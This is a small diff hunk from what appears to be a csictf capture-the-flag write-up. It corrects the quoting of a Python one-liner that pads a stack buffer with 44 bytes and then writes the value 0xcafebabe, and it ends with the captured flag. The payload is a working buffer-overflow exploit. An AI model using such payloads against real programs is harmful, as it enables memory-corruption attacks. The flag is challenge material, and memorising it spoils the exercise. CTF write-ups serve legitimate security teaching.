@@ -109,7 +109,7 @@ when i try to fill stack with values. i found it is 44
 so we can craft our exploit.
 
 
-python -c 'print "A"*44 + '\xbe\xba\xfe\xca'' 
+python -c 'print "A"*44 + "\xbe\xba\xfe\xca" '
 
  
 flag  csictf{c4n_y0u_re4lly_telep0rt?}
